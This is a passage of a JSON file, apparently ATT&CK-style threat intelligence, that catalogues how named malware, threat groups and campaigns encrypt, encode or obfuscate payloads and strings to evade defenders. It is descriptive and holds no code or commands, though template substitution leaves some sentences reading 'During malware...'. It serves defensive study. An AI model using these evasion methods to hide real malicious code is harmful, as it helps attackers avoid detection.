                        "Description": "Some strings in <name> are obfuscated with XOR x56.[90]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has encrypted strings with single-byte XOR and base64 encoded RC4.[91]"
                    },
                    "S0398": {
                        "ID": "S0398",
                        "Name": "HyperBro",
                        "Description": "<name> can be delivered encrypted to a compromised host.[92]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has utilzed encrypted binaries and base64 encoded strings.[93]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.[94]"
                    },
                    "S0581": {
                        "ID": "S0581",
                        "Name": "IronNetInjector",
                        "Description": "<name> can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.[95]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "Many strings in <name> are obfuscated with a XOR algorithm.[96][97][8]"
                    },
                    "S0487": {
                        "ID": "S0487",
                        "Name": "Kessel",
                        "Description": "<name>'s configuration is hardcoded and RC4 encrypted within the binary.[98]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "<name> has Base64-encoded its configuration file.[99]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "In one version of <name>, string obfuscation routines were used to hide many of the critical values referenced in the malware.[100]"
                    },
                    "S1051": {
                        "ID": "S1051",
                        "Name": "KEYPLUG",
                        "Description": "<name> can use a hardcoded one-byte XOR encoded configuration file.[53]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has used encrypted strings in its installer.[101]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> is heavily obfuscated and includes encrypted configuration files.[102]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> downloads additional files that are base64-encoded and encrypted with another cipher.[103]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.[104][105][106][107][44][108][109]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has obfuscated code using base64 and gzip compression.[110]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> encrypts its configuration files with AES-256.[111]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> has encrypted DMG files.[112]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> has been obfuscated and contains encrypted functions.[113]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware has used base64-encoded files and has also encrypted embedded strings with AES.[114][115]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has used scripts encoded in Base64 certificates to distribute malware to victims.[116]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[117][118][119]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has encrypted their payloads.[113]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name>'s module file has been encrypted via XOR.[120]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has encrypted payloads and strings.[121][122]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> obfuscates the configuration with a custom Base64 and XOR.[123][124]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can encode files containing information about the targeted system.[125][99]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys.[126]<name> also uses encoded configuration files and has encoded payloads using Base64.[126][127][116]"
                    },
                    "G0103": {
                        "ID": "G0103",
                        "Name": "Mofang",
                        "Description": "<name> has compressed the ShimRat executable within malicious email attachments. <name> has also encrypted payloads before they are downloaded to victims.[128]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has delivered compressed executables within ZIP files to victims.[129]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name>'s payload has been encrypted with a key that has the hostname and processor family information appended to the end.[130]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has used obfuscated web shells in their operations.[52]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name>\u2019s installer is obfuscated with a custom crypter to obfuscate the installer.[131]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> encodes files in Base64.[132]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used a DLL that included an XOR-encoded section.[133]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "The <name> payload is XOR encrypted and compressed.[134] <name> has also XORed its configuration data with a constant value of 0xAA and compressed it with the LZSS algorithm.[135][134]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has included a base64 encoded executable.[136]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has encrypted and encoded data in its malware, including by using base64.[137][138][139][140][141]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group encrypted malware such as  DRATzarus with XOR and DLL files with base64.[142][143][144][145]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.[146]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors used Base64 to encode files with a custom key.[147]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors used XOR-encrypted payloads.[148]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.[149]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has been encrypted with XOR using different 32-long Base16 strings and compressed with LZW algorithm.[40]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> has encrypted strings in the binary for obfuscation.[150]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> modules are stored encrypted on disk.[151]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "Some resources in <name> are encrypted with a simple XOR operation or encoded with Base64.[152]"
                    },
                    "S0613": {
                        "ID": "S0613",
                        "Name": "PS1",
                        "Description": "<name> is distributed as a set of encrypted files and scripts.[153]"
                    },
                    "G0024": {
                        "ID": "G0024",
                        "Name": "Putter Panda",
                        "Description": "Droppers used by <name> use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 \u2013 0xAF to obfuscate payloads.[154]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.[52]"
                    },
                    "S0565": {
                        "ID": "S0565",
                        "Name": "Raindrop",
                        "Description": "<name> encrypted its payload using a simple XOR algorithm with a single-byte key.[155][156]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> has downloaded as a XOR-encrypted payload.[157]"
                    },
                    "S1113": {
                        "ID": "S1113",
                        "Name": "RAPIDPULSE",
                        "Description": "<name> has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.[158]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can compress and obfuscate its strings to evade detection on a compromised host.[92]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> encrypts some of its files with XOR.[159]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "A <name> configuration file is encrypted with a simple XOR key, 0x53.[160]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> obfuscates its configuration data with XOR.[161]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "Some data in <name> is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.[162][163]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has used encrypted strings and configuration files.[164][165][166][167][168][169][170]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has encrypted strings with a single byte XOR algorithm.[91]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "Configuration data used by <name> has been encrypted using an RC4 stream algorithm.[171]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> uses single-byte XOR obfuscation to obfuscate many of its files.[172]"
                    },
                    "S0370": {
                        "ID": "S0370",
                        "Name": "SamSam",
                        "Description": "<name> has been seen using AES or DES to encrypt payloads and payload components.[173][174]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> obfuscates configuration data.[175]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> can use encrypted and encoded files for C2 configuration.[125][176]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used base64 encoding and ECDH-P256 encryption for payloads.[177][178][179]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has encrypted it's main payload using 3DES.[180]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can encrypt strings at compile time.[181][182]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> uses a simple one-byte XOR method to obfuscate values in the malware.[183][184]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "The <name> JavaScript payload has been delivered within a compressed ZIP archive.[185][186] <name> has also single or double Base-64 encoded references to its second-stage server URLs.[187]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> encodes its second-stage payload with Base64. [188]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has been obfuscated with a XOR-based algorithm.[189][190]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has been obfuscated with hex-encoded strings.[191]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> has obfuscated its module with an alphabet-based table or XOR encryption.[192]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has used encrypted strings in its dropper component.[193][194]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> uses encrypted configuration blocks and writes encrypted files to disk.[195]"
                    },
                    "S0578": {
                        "ID": "S0578",
                        "Name": "SUPERNOVA",
                        "Description": "<name> contained Base64-encoded strings.[196]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can encrypt and encode its configuration file.[197]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used compressed and char-encoded scripts in operations.[198]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has password-protected malicious Word documents.[199]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> can use encrypted string blocks for obfuscation.[200]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has encrypted its binaries via AES and encoded files using Base64.[201][202]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "A <name> tool can encrypt payloads using XOR. <name> malware is also obfuscated using Metasploit\u2019s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[203][204][205]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> has been compressed and obfuscated using RC4, AES, or XOR.[206]"
                    },
                    "S0131": {
                        "ID": "S0131",
                        "Name": "TINYTYPHON",
                        "Description": "<name> has used XOR with 0x90 to obfuscate its configuration file.[207]"
                    },
                    "S0678": {
                        "ID": "S0678",
                        "Name": "Torisma",
                        "Description": "<name> has been Base64 encoded and AES encrypted.[145]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has dropped encoded executables on compromised hosts.[208]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.[209]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has encrypted configuration files.[210][211]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "APIs and strings in some <name> variants are RC4 encrypted. Another variant is encoded with XOR.[212]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use AES and CAST-128 encryption to obfuscate resources.[213]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used an XOR-based algorithm to encrypt Tor clients dropped to disk.[214] <name> droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.[215]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "Most strings in <name> are encrypted using 3DES and XOR and reversed.[216]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> is obfuscated using the obfuscation tool called ConfuserEx.[217]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "A <name> variant is encoded using a simple XOR cipher.[218]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "The <name> payload includes encrypted strings stored within the .bss section of the binary file.[219]"
                    },
                    "S0579": {
                        "ID": "S0579",
                        "Name": "Waterbear",
                        "Description": "<name> has used RC4 encrypted shellcode and encrypted functions.[220]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage.[221][222][223]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has encrypted the payload used for C2.[224]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> can be delivered as a compressed, encrypted, and encoded payload.[225]"
                    },
                    "S0430": {
                        "ID": "S0430",
                        "Name": "Winnti for Linux",
                        "Description": "<name> can encode its configuration file with single-byte XOR encoding.[226]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> has the ability to encrypt and compress its payload.[227]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> has used Base64 encoded strings and scripts.[228]"
                    },
                    "S0388": {
                        "ID": "S0388",
                        "Name": "YAHOYAH",
                        "Description": "<name> encrypts its configuration file using a simple algorithm.[229]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has encrypted its payload with RC4.[230]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> encrypts strings with XOR. <name> also encrypts all configuration and settings in AES and RC4.[231][232]"
                    },
                    "S0672": {
                        "ID": "S0672",
                        "Name": "Zox",
                        "Description": "<name> has been encoded with Base64.[233]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> has been encoded to avoid detection from static analysis tools.[234]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. [1] Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. [2] Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. [3]Adversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. [4] [5][6]",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.[7]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware's commands, strings, and domains can be Base64 encoded within the payload.[8]"
            },
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "Most of the strings in malware are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.[9][10]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has had its code obfuscated in an apparent attempt to make analysis difficult.[11] malware has used the Rijndael symmetric encryption algorithm to encrypt strings.[12]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has obfuscated strings such as antivirus vendor names, domains, files, and others.[13]"
            },
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware has obfuscated code with stack strings and string encryption.[14]"
            },
            "S0584": {
                "ID": "S0584",
                "Name": "AppleJeus",
                "Description": "malware has XOR-encrypted collected system information prior to sending to a C2. malware has also used the open source ADVObfuscation library for its components.[15]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has the ability to Base64 encode its payload and custom encrypt API calls.[16]"
            },
            "G0099": {
                "ID": "G0099",
                "Name": "APT-C-36",
                "Description": "malware has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection.[17]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware obfuscates files or information to help evade defensive measures.[18]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware obfuscates strings and payloads.[19][20][21]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used VMProtected binaries in multiple intrusions.[22]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has used encrypted strings.[23]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has used XOR-encoded strings.[24]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has obfuscated tools and malware it uses with VMProtect.[25]"
            },
            "G0063": {
                "ID": "G0063",
                "Name": "BlackOasis",
                "Description": "malware's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.[26]"
            },
            "S0635": {
                "ID": "S0635",
                "Name": "BoomBox",
                "Description": "malware can encrypt data using AES prior to exfiltration.[27]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware used the \"StackStrings\" obfuscation technique to hide malicious functionalities.[28]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has used encrypted payload files and maintains an encrypted configuration structure in memory.[29][30]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions.[31][32][33]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware has obfuscated data with base64, AES, RC4, and bz2.[34]"
            },
            "S1118": {
                "ID": "S1118",
                "Name": "BUSHWALK",
                "Description": "malware can encrypt the resulting data generated from C2 commands with RC4.[35]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used Base64-encoded strings.[36]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.[37]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware encrypts strings to make analysis more difficult.[38]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.[39][40]"
            },
            "S0465": {
                "ID": "S0465",
                "Name": "CARROTBALL",
                "Description": "malware has used a custom base64 alphabet to decode files.[41]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "The malware executable has been obfuscated when dropped on a compromised host.[42]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware can store obfuscated configuration information in the last 56 bytes of the file /date/.bd.key/preload.so.[43]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.[44][45]"
            },
            "S0369": {
                "ID": "S0369",
                "Name": "CoinTicker",
                "Description": "malware initially downloads a hidden encoded file.[46]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware uses RC4 and Base64 to obfuscate strings.[47]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware has encrypted its virtual file system using AES-256 in XTS mode.[48][49]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware has obfuscated its code to prevent its removal from host machines.[50]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls.[51][52][53]"
            },
            "S0137": {
                "ID": "S0137",
                "Name": "CORESHELL",
                "Description": "malware obfuscates strings using a custom stream cipher.[54]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload.[55]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses a hard-coded string as a seed, along with the victim machine hardware identifier and input text, to generate a unique string used as an internal mutex value to evade static detection based on mutexes.[56]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators.[57]"
            },
            "S0187": {
                "ID": "S0187",
                "Name": "Daserf",
                "Description": "malware uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.[58]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware obfuscates its code and encrypts the API names.[59]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has Base64 encoded the RSA public key used for encrypting files.[60]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.[61]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can be partly encrypted with XOR.[62]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware's strings are obfuscated using RC4.[63]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware has used XOR encrypted payloads in WebSocket client to server messages.[64]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "The malware dropper uses a function to obfuscate the name of functions and other parts of the malware.[65]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware used Base64 to encode strings.[66]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware has obfuscated its strings with a simple XOR encryption with a static key.[67]"
            },
            "S0593": {
                "ID": "S0593",
                "Name": "ECCENTRICBANDWAGON",
                "Description": "malware has encrypted strings with RC4.[68]"
            },
            "S0624": {
                "ID": "S0624",
                "Name": "Ecipekac",
                "Description": "malware can use XOR, AES, and DES to encrypt loader shellcode.[69]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware uses encoded strings in its process kill list.[70]"
            },
            "G1003": {
                "ID": "G1003",
                "Name": "Ember Bear",
                "Description": "malware has obfuscated malware to help avoid detection.[71]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware heavily obfuscates its code to make analysis more difficult.[72]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can use base64 encoding, string stacking, and opaque predicates for obfuscation.[73]"
            },
            "S0355": {
                "ID": "S0355",
                "Name": "Final1stspy",
                "Description": "malware obfuscates strings with base64 encoding.[74]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.[75][76]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been delivered within ZIP or RAR password-protected archived files.[77]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.[78]"
            },
            "G0084": {
                "ID": "G0084",
                "Name": "Gallmaker",
                "Description": "malware obfuscated shellcode used during execution.[79]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has delivered self-extracting 7z archive files within malicious document attachments.[80]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.[59]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware has encrypted strings.[81][82]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.[83]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware uses multiple techniques to obfuscate strings, including XOR.[84]"
            },
            "S0499": {
                "ID": "S0499",
                "Name": "Hancitor",
                "Description": "malware has used Base64 to encode malicious links. malware has also delivered compressed payloads in ZIP files to victims.[85][86]"
            },
            "S0070": {
                "ID": "S0070",
                "Name": "HTTPBrowser",
                "Description": "malware's code may be obfuscated through structured exception handling and return-oriented programming.[87]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware uses basic obfuscation in the form of spaghetti code.[88][89]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.[17]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware uses heavily obfuscated code in its Windows Notepad backdoor.[7]"
            },
            "S0259": {
                "ID": "S0259",
                "Name": "InnaputRAT",
                "Description": "malware uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload.[90]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.[91][92]"
            },
            "S0189": {
                "ID": "S0189",
                "Name": "ISMInjector",
                "Description": "malware is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.[93]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "A malware uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.[94]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware\u2019s Java payload is encrypted with AES.[95] Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of malware also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.[96]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
